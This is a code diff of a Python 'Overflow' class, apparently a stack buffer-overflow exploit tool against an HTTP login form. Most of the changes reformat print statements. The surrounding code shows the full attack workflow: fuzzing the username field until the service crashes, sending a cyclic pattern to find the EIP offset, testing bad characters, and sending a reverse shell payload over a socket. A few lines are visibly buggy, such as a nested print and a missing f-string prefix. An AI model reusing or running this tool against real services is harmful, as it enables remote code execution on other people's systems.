@@ -117,10 +117,10 @@ class Overflow:
 			if not isinstance(targ_port, int):
 				raise InvalidTargetPortError("The target port number must be an integer between 1-65535")
 		except InvalidTargetIPError as err:
-			print(rd + "[-]" + rst + f" Invalid Target IP: {err}")
+			print(rd+"[-]"+rst+f" Invalid Target IP: {err}")
 			exit(1)
 		except InvalidTargetPortError as err:
-			print(rd + "[-]" + rst + f" Invalid Target Port Error: {err}")
+			print(rd+"[-]"+rst+f" Invalid Target Port Error: {err}")
 			exit(1)
 		else:
 			self._targ_ip = targ_ip
@@ -170,7 +170,7 @@ class Overflow:
 			if not search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", new_ip):
 				raise InvalidTargetIPError("The target IP address is not a valid IP address.")
 		except InvalidTargetIPError as err:
-			print(rd + bld + "[-]" + rst + f"Invalid Target IP Error: {err}")
+			print(rd+bld+"[-]"+rst+f" Invalid Target IP Error: {err}")
 		else:
 			self._targ_ip = new_ip
 
@@ -195,7 +195,7 @@ class Overflow:
 			if not isinstance(new_port, int):
 				raise InvalidTargetPortError("Argument must be of type `int`")
 		except InvalidTargetPortError as err:
-			print(rd + bld + "[-]" + rst + f"Invalid Target Port Error: {err}")
+			print(rd+bld+"[-]"+rst+f" Invalid Target Port Error: {err}")
 		else:
 			self._targ_port = new_port
 	
@@ -241,7 +241,7 @@ class Overflow:
 			if not isinstance(max_bytes, int):
 				raise TypeError("The maximum number to test the application with must be an integer")
 		except TypeError as err:
-			print(rd + bld + "[-]" + rst + f"Type Error: {err}")
+			print(rd+bld+"[-]"+rst+f" Type Error: {err}")
 		else:
 			self._max_fuzz_bytes = max_bytes
 
@@ -269,7 +269,7 @@ class Overflow:
 			if not isinstance(new_bytes_value, int):
 				raise TypeError("Argument must be of type `int`")
 		except TypeError as err:
-			print(rd + bld + "[-]" + rst + f"Type Error: {err}")
+			print(rd+bld+"[-]"+rst+f" Type Error: {err}")
 		else:
 			self._num_bytes_crash = new_bytes_value
 		
@@ -295,7 +295,7 @@ class Overflow:
 			if not isinstance(offset_value , int):
 				raise TypeError("Argument must be of type `int`")
 		except TypeError as err:
-			print(rd + bld + "[-]" + rst + f"Type Error: {err}")
+			print(rd+bld+"[-]"+rst+f"Type Error: {err}")
 		else:
 			self._offset = offset_value
 
@@ -324,7 +324,7 @@ class Overflow:
 			if len(jump_mem_location) != 4:
 				raise InvalidMemoryAddressError("The memory address to over the EIP register must be four bytes long")
 		except InvalidMemoryAddressError as err:
-			print(rd + bld + "[-]" + rst + f" Invalid Memory Address Error: {err}")
+			print(rd+bld+"[-]"+rst+f" Invalid Memory Address Error: {err}")
 			exit(1)
 		else:
 			self._jump_eip = jump_mem_location
@@ -350,7 +350,7 @@ class Overflow:
 			if not isinstance(sec, int):
 				raise TypeError("Argument must be of type `int`")
 		except TypeError as err:
-			print(rd + bld + "[-]" + rst + f"Type Error: {err}")
+			print(rd+bld+"[-]"+rst+f"Type Error: {err}")
 		else:
 			self._fuzz_interval_seconds = sec
 
@@ -375,7 +375,7 @@ class Overflow:
 			if not isinstance(new_increment, int):
 				raise TypeError("Argument must be of type `int`")
 		except TypeError as err:
-			print(rd + bld + "[-]" + rst + f"Type Error: {err}")
+			print(rd+bld+"[-]"+rst+f"Type Error: {err}")
 		else:
 			self._fuzz_increment = new_increment
 
@@ -414,8 +414,8 @@ class Overflow:
 		self.num_bytes_crash = 100
 
 		if not chars and not reverse_payload:
-			print(pe + bld + "[+]" + rst + " Intiating fuzzing procedure...")
-			print(yw + bld + "[!]" + rst + " Press Ctrl+C when the application crashes!!")
+			print(pe+bld+"[+]"+rst+" Intiating fuzzing procedure...")
+			print(yw+bld+"[!]"+rst+" Press Ctrl+C when the application crashes!!")
 			while self.num_bytes_crash <= self.max_fuzz_bytes:
 				content = "username=" + "A"*self.num_bytes_crash + "&password=A"
 				buff = self._HTTP_header()
@@ -424,16 +424,16 @@ class Overflow:
 				buff += content
 				soc = self._create_socket()
 				try:
-					print(be + bld + "[+]" + rst + f" Sending payload containing {self.num_bytes_crash} bytes...")
+					print(be+bld+"[+]"+rst+f" Sending payload containing {self.num_bytes_crash} bytes...")
 					soc.send(bytes(buff, "utf-8"))
 					soc.close()
 					self.num_bytes_crash += self.fuzz_increment
 					sleep(self.fuzz_interval_seconds)
 				except KeyboardInterrupt:
-					print(rd + bld + "[!]" + rst + "Don't forget to set the number of bytes it took to crash the application")
+					print(rd+bld+"[!]"+rst +" Don't forget to set the number of bytes it took to crash the application")
 					exit(1)
 				except:
-					print(rd + bld + "[-]" + rst + f" Error occured...")
+					print(rd+bld+"[-]"+rst+f" Error occured...")
 					exit(1)
 		elif chars:
 			try:
@@ -446,7 +446,7 @@ class Overflow:
 						+ "C"*(self.num_bytes_crash-self.offset - 4 - len(chars)) + "&password=A"
 					)
 			except NoOffsetError as err:
-				print(rd + bld + "[-] " + f"No Offset Error: {err}" + rst)
+				print(rd+bld+"[-] "+rst+f"No Offset Error: {err}")
 			buff = self._HTTP_header()
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
@@ -454,11 +454,11 @@ class Overflow:
 
 			soc = self._create_socket()
 
-			print(y + bld +"[+]" + rst + " Sending payload to test bad characters...")
+			print(yw+bld+"[+]"+rst+" Sending payload to test bad characters...")
 			try:
 				soc.send(bytes(buff, "utf-8"))
 			except BaseException as err:
-				print(rd + bld + "[-]" + rst + f" Socket Error: {err}")
+				print(rd+bld+"[-]"+rst+f" Socket Error: {err}")
 				exit(1)
 			finally:
 				soc.close()
@@ -475,11 +475,11 @@ class Overflow:
 
 			soc = self._create_socket()
 
-			print(gn + bld + "[+]" + rst + " Sending reverse shell payload...")
+			print(gn+bld+"[+]"+rst+" Sending reverse shell payload...")
 			try:
 				soc.send(bytes(buff, "utf-8"))
 			except BaseException as err:
-				print(rd + bld + "[-]" + rst + " Socket Error: {err}")
+				print(rd+bld+"[-]"+rst+" Socket Error: {err}")
 				exit(1)
 			finally:
 				soc.close()
@@ -492,14 +492,15 @@ class Overflow:
 		# HANDLE POSSIBLE ERROR:
 		# IF `num_bytes_crash` is not set!!
 		payload = pattern_create(self.num_bytes_crash)
-
+		
 		soc = self._create_socket()
 
 		with soc:
 			bytes_payload = bytes(payload, "utf-8")
-			print(gn + bld + "[+]" + rst + " Sending Msfpattern payload...")
+			print(gn+bld+"[+]"+rst+" Sending Msfpattern payload...")
 			soc.send(bytes_payload)
 		
+
 	def get_offset(self, eip_value):
 		"""Returns the offset based on the `eip_value` argument
 
@@ -524,10 +525,11 @@ class Overflow:
 			else:
 				raise NoOffsetError("Please run `get_offset` to get and set offset value")
 		except NoOffsetError as err:
-			print(rd + bld + "[-]" + rst + f" No Offset Error: {err}")
+			print(rd+bld+"[-]"+rst+f" No Offset Error: {err}")
 			exit(1)
 
 		soc = self._create_socket()
+
 		with soc:
 			soc.send(bytes_payload)
 		
@@ -547,7 +549,7 @@ class Overflow:
 			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			soc.connect((self.targ_ip, self.targ_port))
 		except BaseException as err:
-			print(print(rd + bld + "[-]" + rst + f" Socket Error: {err}"))
+			print(print(rd+bld+"[-]"+rst+f" Socket Error: {err}"))
 			exit(1)
 		return soc
 
